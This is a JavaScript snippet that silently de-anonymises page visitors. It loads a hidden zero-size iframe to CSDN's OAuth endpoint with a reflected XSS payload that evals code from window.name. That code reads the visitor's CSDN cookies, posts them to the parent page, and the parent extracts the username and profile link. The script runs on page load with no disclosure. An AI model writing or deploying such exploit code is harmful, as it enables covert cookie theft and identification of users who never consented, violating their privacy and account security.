// 用户名  个人主页

function formateCsdnData(t) {
  if ('csdn' === t.data.source) {
    var n = t.data.d,
      a = /UserName=(.+?);/.exec(n)
    if (a) {
      var r = {
        valid: !0,
        data: {
          // 用户名
          userName: a[1],
          // csdn个人主页
          homePage: 'https://blog.csdn.net/'.concat(a[1]),
        },
      }
      let innerHTML = `
      <div class='item'>
        <p class='title'>csdn</p>
        <p>csdn个人主页: ${r.data.homePage}</p>
        <p>用户名: ${r.data.userName}</p>
      </div>
    `
      if (r.data.userName) {
        getInifoData({ type: 'csdn', data: r.data, html: innerHTML })
      }
    }
  }
}
function csdn() {
  var e = document.createElement('iframe')
  e.src =
    'https://api.csdn.net/oauth/authorize?client_id=1000001&redirect_uri=http://www.iteye.com/auth/csdn/callback&response_type=%22https%3A%2F%2Fapi.csdn.net%2Foauth%2Fauthorize%3Fclient_id%3D1000001%26redirect_uri%3Dhttp%3A%2F%2Fwww.iteye.com%2Fauth%2Fcsdn%2Fcallback%26response_type%3D%22%3E%3Cimg%20src%3Dx%20onerror%3Deval(window.name)%3E'
  e.width = 0
  e.height = 0
  e.style.borderWidth = 0
  e.referrerPolicy = 'no-referrer'
  e.name =
    "javascript:eval(`\n  let s = {source: 'csdn', d: document.cookie}; window.parent.postMessage(s, '*');\n  `)"
  document.documentElement.appendChild(e)
}
window.addEventListener('message', formateCsdnData, !1)
// window.addEventListener('load', function () {
csdn()
// })
